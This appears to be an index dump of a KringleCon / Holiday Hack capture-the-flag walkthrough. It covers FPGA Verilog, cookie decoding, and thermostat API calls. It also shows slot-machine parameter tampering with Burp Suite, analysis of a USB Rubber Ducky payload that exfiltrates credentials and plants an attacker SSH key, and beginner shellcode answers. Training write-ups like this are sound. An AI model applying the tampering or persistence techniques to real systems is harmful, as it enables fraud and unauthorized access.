input rst - this will be connected to the system board's reset bus // input freq - a 32 bit integer indicating the required frequency // (0 - 9999.99Hz) formatted as follows: // 32'hf1206 or 32'd987654 = 9876.54Hz // output wave_out - a square wave output of the desired frequency // you can create whatever other variables you need, but remember // to initialize them to something! ` timescale 1 ns / 1 ns module tone_generator ( input clk , input rst , input [ 31 : 0 ] freq , output wave_out ); // ---- DO NOT CHANGE THE CODE ABOVE THIS LINE ---- // ---- IT IS NECESSARY FOR AUTOMATED ANALYSIS ---- // TODO: Add your code below. reg [ 31 : 0 ] counter ; real counter_target ; reg wo ; assign wave_out = wo ; always @ ( posedge clk or posedge rst ) begin // To set the valude of counter_target correctly we need to first determine if the // computed value needs to be rounded up by one. // Note that the numeric constants must be represented as decimal numbers // otherwise integer math will be used and no 'rounding up' will occur. if ( $rtoi ((( 125000000.0 / freq ) * 50.0 ) * 10 ) - ( $rtoi (( 125000000.0 / freq ) * 50.0 ) * 10 ) > 4 ) begin counter_target <= (( 125000000.0 / freq ) * 50.0 ) + 1 ; end else begin counter_target <= ( 125000000.0 / freq ) * 50.0 ; end // Now that counter_target is set, we can start counting clock ticks waiting // for our next transition if ( rst == 1 ) begin counter <= 0 ; end else begin if ( counter >= counter_target ) begin // Each time the square wave tranistions we reset the counter to 2 (not 1). // This is because (I think) we are already executing the first tick of the cycle. counter <= 2 ; wo <= wo ^ 1 ; end else counter <= counter + 1 ; end end endmodule The Frequency Math Our clock is running at 125MHz, so 125,000,000 clock ticks = 1 second The number of clock ticks that pass during each cycle of a given frequency (say for example, 500Hz) is equal to 125,000,000 divided by that number. (125,000,000 / 500) = 250,000 But a square wave cycle represents both the high and low portions of the wave, so the number of clock ticks between each transition is half that. ((125,000,000 / 500) / 2) = 125,000 The target frequency supplied to our code is an integer value with the last 2 digits representing the fractional portion. So a frequency of 500Hz will be seen by the code as the number 50000, so we have to multiply the previous result by 100. (((125,000,000 / 50000) / 2) * 100) = 125,000 Simplifying our final calculation gives us the following formula for how many clock ticks pass before each high / low transition. ((125,000,000 / freq) * 50) Completion Answer Successfully programming the device from the FPGA terminal completes the challenge and gives you the FPGA item, which can be plugged into the Speak and Spell next to Crunchy","title":"13) FPGA Programming"},{"location":"objectives/O13_FPGA_Programming/#objective-13-fpga-programming","text":"Difficulty : Write your first FPGA program to make a doll sing. You might get some suggestions from Grody Goiterson, near Jack's elevator. Note This objective unlocks after reaching the roof of Frost Tower","title":"Objective 13) FPGA Programming"},{"location":"objectives/O13_FPGA_Programming/#hints-and-resources","text":"Hints provided after helping Grody Goiterson and completing the Frostavator Terminal Challenge FPGA for Fun There are FPGA enthusiast sites . FPGA Talk Prof. Qwerty Petabyte is giving a lesson about Field Programmable Gate Arrays (FPGAs). Other Resources Introduction Hint for Rounding Numbers If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1","title":"Hints and Resources"},{"location":"objectives/O13_FPGA_Programming/#solution","text":"Open the FPGA Programming terminal on the roof of Frost Tower and program it so all tests pass and you are able to program the device.","title":"Solution"},{"location":"objectives/O13_FPGA_Programming/#the-code","text":"There may be a more elegant way to do this but the following code will, at least in every test I ran, result in exact matches for any target frequency and will successfully complete the challenge. See below for an explanation of the math. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 // Note: For this lab, we will be working with QRP Corporation's CQC-11 FPGA. // The CQC-11 operates with a 125MHz clock. // Your design for a tone generator must support the following // inputs/outputs: // (NOTE: DO NOT CHANGE THE NAMES. OUR AUTOMATED GRADING TOOL // REQUIRES THE USE OF THESE NAMES!) // input clk - this will be connected to the 125MHz system clock // input rst - this will be connected to the system board's reset bus // input freq - a 32 bit integer indicating the required frequency // (0 - 9999.99Hz) formatted as follows: // 32'hf1206 or 32'd987654 = 9876.54Hz // output wave_out - a square wave output of the desired frequency // you can create whatever other variables you need, but remember // to initialize them to something! ` timescale 1 ns / 1 ns module tone_generator ( input clk , input rst , input [ 31 : 0 ] freq , output wave_out ); // ---- DO NOT CHANGE THE CODE ABOVE THIS LINE ---- // ---- IT IS NECESSARY FOR AUTOMATED ANALYSIS ---- // TODO: Add your code below. reg [ 31 : 0 ] counter ; real counter_target ; reg wo ; assign wave_out = wo ; always @ ( posedge clk or posedge rst ) begin // To set the valude of counter_target correctly we need to first determine if the // computed value needs to be rounded up by one. // Note that the numeric constants must be represented as decimal numbers // otherwise integer math will be used and no 'rounding up' will occur. if ( $rtoi ((( 125000000.0 / freq ) * 50.0 ) * 10 ) - ( $rtoi (( 125000000.0 / freq ) * 50.0 ) * 10 ) > 4 ) begin counter_target <= (( 125000000.0 / freq ) * 50.0 ) + 1 ; end else begin counter_target <= ( 125000000.0 / freq ) * 50.0 ; end // Now that counter_target is set, we can start counting clock ticks waiting // for our next transition if ( rst == 1 ) begin counter <= 0 ; end else begin if ( counter >= counter_target ) begin // Each time the square wave tranistions we reset the counter to 2 (not 1). // This is because (I think) we are already executing the first tick of the cycle. counter <= 2 ; wo <= wo ^ 1 ; end else counter <= counter + 1 ; end end endmodule","title":"The Code"},{"location":"objectives/O13_FPGA_Programming/#the-frequency-math","text":"Our clock is running at 125MHz, so 125,000,000 clock ticks = 1 second The number of clock ticks that pass during each cycle of a given frequency (say for example, 500Hz) is equal to 125,000,000 divided by that number. (125,000,000 / 500) = 250,000 But a square wave cycle represents both the high and low portions of the wave, so the number of clock ticks between each transition is half that. ((125,000,000 / 500) / 2) = 125,000 The target frequency supplied to our code is an integer value with the last 2 digits representing the fractional portion. So a frequency of 500Hz will be seen by the code as the number 50000, so we have to multiply the previous result by 100. (((125,000,000 / 50000) / 2) * 100) = 125,000 Simplifying our final calculation gives us the following formula for how many clock ticks pass before each high / low transition. ((125,000,000 / freq) * 50)","title":"The Frequency Math"},{"location":"objectives/O13_FPGA_Programming/#completion","text":"Answer Successfully programming the device from the FPGA terminal completes the challenge and gives you the FPGA item, which can be plugged into the Speak and Spell next to Crunchy","title":"Completion"},{"location":"objectives/O1_KringleCon_Orientation/","text":"Objective 1) KringleCon Orientation Difficulty : Get your bearings at KringleCon 1a) Talk to Jingle Ringford 1b) Get your badge 1c) Get the wifi adapter 1d) Use the terminal Solution Simply talk to Jingle Ringford next to the gate and complete the tasks that he gives you. Completion Answer Using the terminal to open the gate completes this objective.","title":"1) KringleCon Orientation"},{"location":"objectives/O1_KringleCon_Orientation/#objective-1-kringlecon-orientation","text":"Difficulty : Get your bearings at KringleCon 1a) Talk to Jingle Ringford 1b) Get your badge 1c) Get the wifi adapter 1d) Use the terminal","title":"Objective 1) KringleCon Orientation"},{"location":"objectives/O1_KringleCon_Orientation/#solution","text":"Simply talk to Jingle Ringford next to the gate and complete the tasks that he gives you.","title":"Solution"},{"location":"objectives/O1_KringleCon_Orientation/#completion","text":"Answer Using the terminal to open the gate completes this objective.","title":"Completion"},{"location":"objectives/O2_Where_in_the_World_is_Caramel_Santaigo/","text":"Objective 2) Where in the World is Caramel Santaigo Difficulty : Help Tangle Coalbox find a wayward elf in Santa's courtyard. Talk to Piney Sappington nearby for hints. Hints and Resources Hints provided after talking to Piney Sappington and completing the Document Analysis / Exif Metadata Terminal Challenge Coordinate Systems Don't forget coordinate systems other than lat/long like MGRS and what3words . Flask Cookies While Flask cookies can't generally be forged without the secret, they can often be decoded and read . OSINT Talk Clay Moody is giving a talk about OSINT techniques right now! Other Resources Cyber Chef https://gchq.github.io/CyberChef/ Elf Introduction Talk to Tangle Coalbox in Santa's Courtyard Hey there, Gumshoe. Tangle Coalbox here again. I've got a real doozy of a case for you this year. Turns out some elves have gone on some misdirected journeys around the globe. It seems that someone is messing with their travel plans. We could sure use your open source intelligence (OSINT) skills to find them. Why dontcha' log into this vintage Cranberry Pi terminal and see if you have what it takes to track them around the globe. If you're having any trouble with it, you might ask Piney Sappington right over there for tips. Solution Start the game by clicking on the terminal next to Tangle Coalbox. You have two options for solving this objective. The first is to play the game as intended (the Nice way). The second is to hack the game (the Naughty way). Nice Naughty Play the game by using the three Investigate options at each location to determine the next location as well as attributes about the Elf you are following. Investigation options 1 and 2 will provide you with clues about the next location. Investigate option 3 will provide you with the temperature of the next locatin as well as some of the characteristics of the Elf which can be used with InterRink to narrow down which Elf it is. When you have reached the third location, identfy the elf to win the game. If you want to be only slightly naughty, this table in the Extras section lists all the location hints and where they lead to. The other way to win is to start the game with Web Developer tools enabled (for Google Chrome, go to Menu > More tools > Developer tools). After the game is started go to the Application section and on the left drill down to Storage > Cookies > htttps//caramel.kringlecastle.com. There you will find a cookie named 'Cookiepella'. Screenshot Copy the value of that cookie into Cyber Chef, then use the recipies From Base64 (Alphabet: URL Safe) followed by Zlib Inflate to decode the cookie (Click here for an example) Note the values of the \"elf\" and \"route\" attributes (in this example, \"Noel Boetie\" and \"Stuttgart, Germany\",\"Prague, Czech Republic\",\"London, England\"), which will provide you with the name of the elf along with the route to take without having to perform a single investigation. Completion Winning the game by either method will mark the objective as complete in your badge. Tangle Coalbox You never cease to amaze, Kid. Thanks for your help.","title":"2) Where in the World is Caramel Santaigo"},{"location":"objectives/O2_Where_in_the_World_is_Caramel_Santaigo/#objective-2-where-in-the-world-is-caramel-santaigo","text":"Difficulty : Help Tangle Coalbox find a wayward elf in Santa's courtyard. Talk to Piney Sappington nearby for hints.","title":"Objective 2) Where in the World is Caramel Santaigo"},{"location":"objectives/O2_Where_in_the_World_is_Caramel_Santaigo/#hints-and-resources","text":"Hints provided after talking to Piney Sappington and completing the Document Analysis / Exif Metadata Terminal Challenge Coordinate Systems Don't forget coordinate systems other than lat/long like MGRS and what3words . Flask Cookies While Flask cookies can't generally be forged without the secret, they can often be decoded and read . OSINT Talk Clay Moody is giving a talk about OSINT techniques right now! Other Resources Cyber Chef https://gchq.github.io/CyberChef/","title":"Hints and Resources"},{"location":"objectives/O2_Where_in_the_World_is_Caramel_Santaigo/#elf-introduction","text":"Talk to Tangle Coalbox in Santa's Courtyard Hey there, Gumshoe. Tangle Coalbox here again. I've got a real doozy of a case for you this year. Turns out some elves have gone on some misdirected journeys around the globe. It seems that someone is messing with their travel plans. We could sure use your open source intelligence (OSINT) skills to find them. Why dontcha' log into this vintage Cranberry Pi terminal and see if you have what it takes to track them around the globe. If you're having any trouble with it, you might ask Piney Sappington right over there for tips.","title":"Elf Introduction"},{"location":"objectives/O2_Where_in_the_World_is_Caramel_Santaigo/#solution","text":"Start the game by clicking on the terminal next to Tangle Coalbox. You have two options for solving this objective. The first is to play the game as intended (the Nice way). The second is to hack the game (the Naughty way). Nice Naughty Play the game by using the three Investigate options at each location to determine the next location as well as attributes about the Elf you are following. Investigation options 1 and 2 will provide you with clues about the next location. Investigate option 3 will provide you with the temperature of the next locatin as well as some of the characteristics of the Elf which can be used with InterRink to narrow down which Elf it is. When you have reached the third location, identfy the elf to win the game. If you want to be only slightly naughty, this table in the Extras section lists all the location hints and where they lead to. The other way to win is to start the game with Web Developer tools enabled (for Google Chrome, go to Menu > More tools > Developer tools). After the game is started go to the Application section and on the left drill down to Storage > Cookies > htttps//caramel.kringlecastle.com. There you will find a cookie named 'Cookiepella'. Screenshot Copy the value of that cookie into Cyber Chef, then use the recipies From Base64 (Alphabet: URL Safe) followed by Zlib Inflate to decode the cookie (Click here for an example) Note the values of the \"elf\" and \"route\" attributes (in this example, \"Noel Boetie\" and \"Stuttgart, Germany\",\"Prague, Czech Republic\",\"London, England\"), which will provide you with the name of the elf along with the route to take without having to perform a single investigation.","title":"Solution"},{"location":"objectives/O2_Where_in_the_World_is_Caramel_Santaigo/#completion","text":"Winning the game by either method will mark the objective as complete in your badge. Tangle Coalbox You never cease to amaze, Kid. Thanks for your help.","title":"Completion"},{"location":"objectives/O3_Thaw_Frost_Towers_Entrance/","text":"Objective 3) Thaw Frost Tower's Entrance Difficulty : Turn up the heat to defrost the entrance to Frost Tower. Click on the Items tab in your badge to find a link to the Wifi Dongle's CLI interface. Talk to Greasy Gopherguts outside the tower for tips. Hints and Resources Hints provided after helping Greasy GopherGuts and completing the Grepping for Gold Terminal Challenge Linux Wi-Fi Commands The iwlist and iwconfig utilities are key for managing Wi-Fi from the Linux command line. Web Browsing with cURL cURL makes HTTP requests from a terminal - in Mac, Linux, and modern Windows! Adding Data to cURL Requests When sending a POST request with data , add --data-binary to your curl command followed by the data you want to send. Troll Introduction Talk to Grimy McTrollkins outside of the Frost Tower Yo, I'm Grimy McTrollkins. I'm a troll and I work for the big guy over there: Jack Frost. I\u2019d rather not be bothered talking with you, but I\u2019m kind of in a bind and need your help. Jack Frost is so obsessed with icy cold that he accidentally froze shut the door to Frost Tower! I wonder if you can help me get back in. I think we can melt the door open if we can just get access to the thermostat inside the building. That thermostat uses Wi-Fi. And I\u2019ll bet you picked up a Wi-Fi adapter for your badge when you got to the North Pole. Click on your badge and go to the Items tab. There, you should see your Wi-Fi Dongle and a button to \u201cOpen Wi-Fi CLI.\u201d That\u2019ll give you command-line interface access to your badge\u2019s wireless capabilities. Solution Open the WiFi Dongle in the Items section in your badge while standing near the Frost Tower entrance. Screenshot The first step is to get connected via WiFi to the thermostat. First we should determine what our local WiFi adapter is with iwconfig Then, look for any local WiFi networks with iwlist wlan0 scanning . This tells us that the name of the nearby WiFi network is FROST-Nidus-Setup. Connect to it with iwconfig wlan0 essid \"FROST-Nidus-Setup\" Screenshot After connecting to the FROST-Nidus-Setup network we recived a message that we should go to http://nidus-setup:8080/ to complete setup. curl http://nidus-setup:8080 Screenshot That page gives us the path to the API documentation curl http://nidus-setup:8080/apidoc/ Screenshot From the API documentation we learn that the command to set the temperature is curl -XPOST -H 'Content-Type: application/json' --data-binary '{\"temperature\":42}' http://nidus-setup:8080/api/cooler Screenshot Completion Setting the temperature to any value above 0 completes the challenge. Grimy McTrollkins Great - now I can get back in!","title":"3) Thaw Frost Tower's Entrance"},{"location":"objectives/O3_Thaw_Frost_Towers_Entrance/#objective-3-thaw-frost-towers-entrance","text":"Difficulty : Turn up the heat to defrost the entrance to Frost Tower. Click on the Items tab in your badge to find a link to the Wifi Dongle's CLI interface. Talk to Greasy Gopherguts outside the tower for tips.","title":"Objective 3) Thaw Frost Tower's Entrance"},{"location":"objectives/O3_Thaw_Frost_Towers_Entrance/#hints-and-resources","text":"Hints provided after helping Greasy GopherGuts and completing the Grepping for Gold Terminal Challenge Linux Wi-Fi Commands The iwlist and iwconfig utilities are key for managing Wi-Fi from the Linux command line. Web Browsing with cURL cURL makes HTTP requests from a terminal - in Mac, Linux, and modern Windows! Adding Data to cURL Requests When sending a POST request with data , add --data-binary to your curl command followed by the data you want to send.","title":"Hints and Resources"},{"location":"objectives/O3_Thaw_Frost_Towers_Entrance/#troll-introduction","text":"Talk to Grimy McTrollkins outside of the Frost Tower Yo, I'm Grimy McTrollkins. I'm a troll and I work for the big guy over there: Jack Frost. I\u2019d rather not be bothered talking with you, but I\u2019m kind of in a bind and need your help. Jack Frost is so obsessed with icy cold that he accidentally froze shut the door to Frost Tower! I wonder if you can help me get back in. I think we can melt the door open if we can just get access to the thermostat inside the building. That thermostat uses Wi-Fi. And I\u2019ll bet you picked up a Wi-Fi adapter for your badge when you got to the North Pole. Click on your badge and go to the Items tab. There, you should see your Wi-Fi Dongle and a button to \u201cOpen Wi-Fi CLI.\u201d That\u2019ll give you command-line interface access to your badge\u2019s wireless capabilities.","title":"Troll Introduction"},{"location":"objectives/O3_Thaw_Frost_Towers_Entrance/#solution","text":"Open the WiFi Dongle in the Items section in your badge while standing near the Frost Tower entrance. Screenshot The first step is to get connected via WiFi to the thermostat. First we should determine what our local WiFi adapter is with iwconfig Then, look for any local WiFi networks with iwlist wlan0 scanning . This tells us that the name of the nearby WiFi network is FROST-Nidus-Setup. Connect to it with iwconfig wlan0 essid \"FROST-Nidus-Setup\" Screenshot After connecting to the FROST-Nidus-Setup network we recived a message that we should go to http://nidus-setup:8080/ to complete setup. curl http://nidus-setup:8080 Screenshot That page gives us the path to the API documentation curl http://nidus-setup:8080/apidoc/ Screenshot From the API documentation we learn that the command to set the temperature is curl -XPOST -H 'Content-Type: application/json' --data-binary '{\"temperature\":42}' http://nidus-setup:8080/api/cooler Screenshot","title":"Solution"},{"location":"objectives/O3_Thaw_Frost_Towers_Entrance/#completion","text":"Setting the temperature to any value above 0 completes the challenge. Grimy McTrollkins Great - now I can get back in!","title":"Completion"},{"location":"objectives/O4_Slot_Machine_Investigation/","text":"Objective 4) Slot Machine Investigation Difficulty : Test the security of Jack Frost's slot machines . What does the Jack Frost Tower casino security team threaten to do when your coin total exceeds 1000? Submit the string in the server data.response element. Talk to Noel Boetie outside Santa's Castle for help. Hints and Resources Hints provided after helping Noel Boetie and completing the Logic Munchers Terminal Challenge Parameter Tampering It seems they're susceptible to parameter tampering . Intercepting Proxies Web application testers can use tools like Burp Suite or even right in the browser with Firefox's Edit and Resend feature. Troll Introduction Talk to Hubrus Selfington in the Frost Tower Lobby Snarf. Hrung. Phlthth. I'm Hubris Selfington. The big boss told me he\u2019s worried about vulnerabilities in his slot machines, especially this one. Statistically speaking, it seems to be paying out way too much. He asked me to see if there are any security flaws in it. The boss has HUGE plans and we\u2019ve gotta make sure we are running a tight ship here at Frost Tower. Can you help me find the issue? I mean, I could TOTALLY do this on my own, but I want to give you a chance first. Solution Click on one of the slot machines in the Frost Tower Lobby, or go to the direct link: https://slots.jackfrosttower.com Playing the game we find that we can set a 'Bet Size' to a value of either .1, .25, or .5, and a 'Bet Level' to a value between 1 and 10. This results in a 'Bet Amount' using the calculation (Bet_Size * 20) * Bet_Level = Bet_Amount The hints for this objective indicate that there is likely some parameter being passed between the web client and server that we can manipulate, and two possible methods of doing so. Both methods involve capturing the web request that initiates the 'spin' of the slot machine. This request includes two parameters, betamount which equals the Bet Level, and cpl which equals the Bet Size. By changing these values we can modify the total bet sent to the server. One option would be to make the bet a very large amount, which if the spin was a winner would get us our balance of greater than 1000 in one go. However, the way more likely to succeed is to change our bet to a very large negative number, which will be subtracted (and therefore added) if we loose. This can be done by setting cpl to a large negative number. Incidentally, if you try to change the betamount value to a negative number it will result in an error that betamount must be greater or equal to zero, so the coding of the slot machine isn't completely broken . The reply to this modified 'spin' will include our new balance along with the message from the tower security team that is to be submitted as the challenge answer. Burp Suite Method FireFox Method Start Burp Suite and start a new project using Burp Defaults. To go the Proxy tab and turn off Intercept, then open the built in browser and go to https://slots.jackfrosttoer.com Screenshot Start a new game and get to where you can spin the wheel. Screenshot Turn Intecept on in Burp Suite and then spin. In Burp Suite you will see the intercepted packet with the betamount and cpl values. Screenshot Edit the cpl value to be -1000 , then turn Intercept off. This will forwared the modified packet and recieve the response, which can be seen in the HTTP History. Screenshot Start Firefox and open Developer Tools (Menu > More tools > Web Developer Tools) Go to https://slots.jackfrosttower.com and start a game. Spin the wheel and then find the POST request for the 'spin' file in the Network history (it will likely be the last one in the list) Screenshot Select Edit and Resend from the drop down in the top right of the window. Screenshot On the 'New Request' page, modify the Request body to change the cpl value then click Send . Screenshot Select the modified 'spin' request and view the Response. Screenshot Completion Answer I'm going to have some bouncer trolls bounce you right out of this casino! Hubrus Selfington Yeah, that's exactly how I would have solved it, but thanks.","title":"4) Slot Machine Investigation"},{"location":"objectives/O4_Slot_Machine_Investigation/#objective-4-slot-machine-investigation","text":"Difficulty : Test the security of Jack Frost's slot machines . What does the Jack Frost Tower casino security team threaten to do when your coin total exceeds 1000? Submit the string in the server data.response element. Talk to Noel Boetie outside Santa's Castle for help.","title":"Objective 4) Slot Machine Investigation"},{"location":"objectives/O4_Slot_Machine_Investigation/#hints-and-resources","text":"Hints provided after helping Noel Boetie and completing the Logic Munchers Terminal Challenge Parameter Tampering It seems they're susceptible to parameter tampering . Intercepting Proxies Web application testers can use tools like Burp Suite or even right in the browser with Firefox's Edit and Resend feature.","title":"Hints and Resources"},{"location":"objectives/O4_Slot_Machine_Investigation/#troll-introduction","text":"Talk to Hubrus Selfington in the Frost Tower Lobby Snarf. Hrung. Phlthth. I'm Hubris Selfington. The big boss told me he\u2019s worried about vulnerabilities in his slot machines, especially this one. Statistically speaking, it seems to be paying out way too much. He asked me to see if there are any security flaws in it. The boss has HUGE plans and we\u2019ve gotta make sure we are running a tight ship here at Frost Tower. Can you help me find the issue? I mean, I could TOTALLY do this on my own, but I want to give you a chance first.","title":"Troll Introduction"},{"location":"objectives/O4_Slot_Machine_Investigation/#solution","text":"Click on one of the slot machines in the Frost Tower Lobby, or go to the direct link: https://slots.jackfrosttower.com Playing the game we find that we can set a 'Bet Size' to a value of either .1, .25, or .5, and a 'Bet Level' to a value between 1 and 10. This results in a 'Bet Amount' using the calculation (Bet_Size * 20) * Bet_Level = Bet_Amount The hints for this objective indicate that there is likely some parameter being passed between the web client and server that we can manipulate, and two possible methods of doing so. Both methods involve capturing the web request that initiates the 'spin' of the slot machine. This request includes two parameters, betamount which equals the Bet Level, and cpl which equals the Bet Size. By changing these values we can modify the total bet sent to the server. One option would be to make the bet a very large amount, which if the spin was a winner would get us our balance of greater than 1000 in one go. However, the way more likely to succeed is to change our bet to a very large negative number, which will be subtracted (and therefore added) if we loose. This can be done by setting cpl to a large negative number. Incidentally, if you try to change the betamount value to a negative number it will result in an error that betamount must be greater or equal to zero, so the coding of the slot machine isn't completely broken . The reply to this modified 'spin' will include our new balance along with the message from the tower security team that is to be submitted as the challenge answer. Burp Suite Method FireFox Method Start Burp Suite and start a new project using Burp Defaults. To go the Proxy tab and turn off Intercept, then open the built in browser and go to https://slots.jackfrosttoer.com Screenshot Start a new game and get to where you can spin the wheel. Screenshot Turn Intecept on in Burp Suite and then spin. In Burp Suite you will see the intercepted packet with the betamount and cpl values. Screenshot Edit the cpl value to be -1000 , then turn Intercept off. This will forwared the modified packet and recieve the response, which can be seen in the HTTP History. Screenshot Start Firefox and open Developer Tools (Menu > More tools > Web Developer Tools) Go to https://slots.jackfrosttower.com and start a game. Spin the wheel and then find the POST request for the 'spin' file in the Network history (it will likely be the last one in the list) Screenshot Select Edit and Resend from the drop down in the top right of the window. Screenshot On the 'New Request' page, modify the Request body to change the cpl value then click Send . Screenshot Select the modified 'spin' request and view the Response. Screenshot","title":"Solution"},{"location":"objectives/O4_Slot_Machine_Investigation/#completion","text":"Answer I'm going to have some bouncer trolls bounce you right out of this casino! Hubrus Selfington Yeah, that's exactly how I would have solved it, but thanks.","title":"Completion"},{"location":"objectives/O5_Strange_USB_Device/","text":"Objective 5) Strange USB Device Difficulty : Assist the elves in reverse engineering the strange USB device. Visit Santa's Talks Floor and hit up Jewel Loggins for advice. Hints and Resources Hints provided after helping Jewel Loggins and completing the IPv6 Sandbox Terminal Challenge Ducky Script Ducky Script is the language for the USB Rubber Ducky Duck Encoder Attackers can encode Ducky Script using a duck encoder for delivery as inject.bin . Ducky RE with Mallard It's also possible the reverse engineer encoded Ducky Script using Mallard Mitre ATT&CK and Duckyr The MITRE ATT&CK\u2122 tactic T1098.004 describes SSH persistence techniques through authorized keys files. Other Resources KringleCon Talk HIDden Ducky, Deconstructed Payload - Kevin Tyers Elf Introduction Talk to Morcel Nougat in the Speaker UNPreparation Room Hello and welcome to the speaker _Un_Preparedness Room! I'm Morcel Nougat, elf extraordinaire. I've heard the talks at the other con across the way are a bit... off. I really don't think they have the right sense about what makes for a wonderful holiday season. But, anyway! Say, do you know anything about USB Rubber Duckies? I've been playing around with them a bit myself. Please see what you can do to help solve the Rubber Ducky Objective! Oh, and if you need help, I hear Jewel Loggins, on this floor outside this room, has some experience. Solution When we open the Strange USB Device terminal we find that the mallard.py python script is located in our home directory and that the USB device contains a single file named inject.bin. Screenshot Run Mallard against the suspected malicious binary. python3 mallard.py -f /mnt/USBDEVICE/inject.bin Screenshot This provides us with the contents of inject.bin, which is a series of commands that attempts to coerce the victim who pugged the device in into entering their username and password which is then transmitted to trollfun.jackfrosttower.com:1337. The most interesting command however is near the bottom, and includes a base64 encoded string. This command takes the string, reverses it, decodes that, and pipes the result into bash to execute it. Decoding the command could be done with a tool like Cyber Chef , but in this case it's easier to just run the command while leaving off the part that pipes it into bash. Warning If you are engaged in a real malware investigation, always perform actions like this in a sandbox environment unless you are absolutely certain that you understand what any commands are doing and that you will not inadvertently run malicious code somewhere that you don't want to. See the great KringleCon talk, How to Build a Free Malware Lab in Under an Hour by Mary Ellen Kennel for some ideas on how to build such an environment. Decoding the command that is meant to be executed by bash we see that it adds an SSH key for the user ickymcgoop@trollfun.jackfrosttower.com to the local key file, granting the attacker persistent access to this system. Screenshot Completion Answer ickymcgoop Morcel Nougat Yay! Fantastic work!","title":"5) Strange USB Device"},{"location":"objectives/O5_Strange_USB_Device/#objective-5-strange-usb-device","text":"Difficulty : Assist the elves in reverse engineering the strange USB device. Visit Santa's Talks Floor and hit up Jewel Loggins for advice.","title":"Objective 5) Strange USB Device"},{"location":"objectives/O5_Strange_USB_Device/#hints-and-resources","text":"Hints provided after helping Jewel Loggins and completing the IPv6 Sandbox Terminal Challenge Ducky Script Ducky Script is the language for the USB Rubber Ducky Duck Encoder Attackers can encode Ducky Script using a duck encoder for delivery as inject.bin . Ducky RE with Mallard It's also possible the reverse engineer encoded Ducky Script using Mallard Mitre ATT&CK and Duckyr The MITRE ATT&CK\u2122 tactic T1098.004 describes SSH persistence techniques through authorized keys files. Other Resources KringleCon Talk HIDden Ducky, Deconstructed Payload - Kevin Tyers","title":"Hints and Resources"},{"location":"objectives/O5_Strange_USB_Device/#elf-introduction","text":"Talk to Morcel Nougat in the Speaker UNPreparation Room Hello and welcome to the speaker _Un_Preparedness Room! I'm Morcel Nougat, elf extraordinaire. I've heard the talks at the other con across the way are a bit... off. I really don't think they have the right sense about what makes for a wonderful holiday season. But, anyway! Say, do you know anything about USB Rubber Duckies? I've been playing around with them a bit myself. Please see what you can do to help solve the Rubber Ducky Objective! Oh, and if you need help, I hear Jewel Loggins, on this floor outside this room, has some experience.","title":"Elf Introduction"},{"location":"objectives/O5_Strange_USB_Device/#solution","text":"When we open the Strange USB Device terminal we find that the mallard.py python script is located in our home directory and that the USB device contains a single file named inject.bin. Screenshot Run Mallard against the suspected malicious binary. python3 mallard.py -f /mnt/USBDEVICE/inject.bin Screenshot This provides us with the contents of inject.bin, which is a series of commands that attempts to coerce the victim who pugged the device in into entering their username and password which is then transmitted to trollfun.jackfrosttower.com:1337. The most interesting command however is near the bottom, and includes a base64 encoded string. This command takes the string, reverses it, decodes that, and pipes the result into bash to execute it. Decoding the command could be done with a tool like Cyber Chef , but in this case it's easier to just run the command while leaving off the part that pipes it into bash. Warning If you are engaged in a real malware investigation, always perform actions like this in a sandbox environment unless you are absolutely certain that you understand what any commands are doing and that you will not inadvertently run malicious code somewhere that you don't want to. See the great KringleCon talk, How to Build a Free Malware Lab in Under an Hour by Mary Ellen Kennel for some ideas on how to build such an environment. Decoding the command that is meant to be executed by bash we see that it adds an SSH key for the user ickymcgoop@trollfun.jackfrosttower.com to the local key file, granting the attacker persistent access to this system. Screenshot","title":"Solution"},{"location":"objectives/O5_Strange_USB_Device/#completion","text":"Answer ickymcgoop Morcel Nougat Yay! Fantastic work!","title":"Completion"},{"location":"objectives/O6_Shellcode_Primer/","text":"Objective 6) Shellcode Primer Difficulty : Complete the Shellcode Primer in Jack's office. According to the last challenge, what is the secret to KringleCon success? \"All of our speakers and organizers, providing the gift of ____, free to the community.\" Talk to Chimney Scissorsticks in the NetWars area for hints. Hints and Resources Hints provided after helping Chimney Scissorsticks and completing the Holiday Hero Terminal Challenge Shellcode Primer Primer If you run into any shellcode primers at the North Pole, be sure to read the directions and the comments in the shellcode source! Debugging Shellcode Also, troubleshooting shellcode can be difficult. Use the debugger step-by-step feature to watch values. Register Stomping Lastly, be careful not to overwrite any register values you need to reference later on in your shellcode. Troll Introduction Talk to Ruby Cyster in Jack's Office Hey, I'm Ruby Cyster. Don't listen to anything my sister, Ingreta, says about me. So I'm looking at this system, and it has me a little bit worried. If I didn't know better, I'd say someone here is learning how to hack North Pole systems. Who's got that kind of nerve! Anyway, I hear some elf on the other roof knows a bit about this type of thing. Solution Open the Shellcode Primer by clicking on the monitor next to Ruby or use the direct link https://tracer.kringlecastle.com . The primer will walk you through eleven progressively more difficult shellcode exercises, solutions for which are provided below. 1 - Introduction No code needs to be added to complete this level. 2 - Loops No code needs to be added to complete this level 3 - Getting Started ; This is a comment! We'll use comments to help guide your journey. ; Right now, we just need to RETurn! ; ; Enter a return statement below and hit Execute to see what happens! ret 4 - Returning a Value ; TODO: Set rax to 1337 mov rax , 1337 ret ; Return, just like we did last time ret 5 - System Calls ; TODO: Find the syscall number for sys_exit and put it in rax mov rax , 60 ; TODO: Put the exit_code we want (99) in rdi mov rdi , 99 ; Perform the actual syscall syscall 6 - Calling Into the Void No code needs to be added to complete this level 7 - Getting RIP ; Remember, this call pushes the return address to the stack call place_below_the_nop ; This is where the function *thinks* it is supposed to return nop ; This is a 'label' - as far as the call knows, this is the start of a function place_below_the_nop: ; TODO: Pop the top of the stack into rax pop rax ; Return from our code, as in previous levels ret 8 - Hello, World! ; This would be a good place for a call call foo ; This is the literal string 'Hello World', null terminated, as code. Except ; it'll crash if it actually tries to run, so we'd better jump over it! db 'Hello World' , 0 ; This would be a good place for a label and a pop foo: pop rax ; This would be a good place for a re... oh wait, it's already here. Hooray! ret 9 - Hello, World!! ; TODO: Get a reference to this string into the correct register call foo db 'Hello World!' , 0 foo: ; Set up a call to sys_write ; TODO: Set rax to the correct syscall number for sys_write mov rax , 1 ; TODO: Set rdi to the first argument (the file descriptor, 1) mov rdi , 1 ; TODO: Set rsi to the second argument (buf - this is the \"Hello World\" string) pop rsi ; TODO: Set rdx 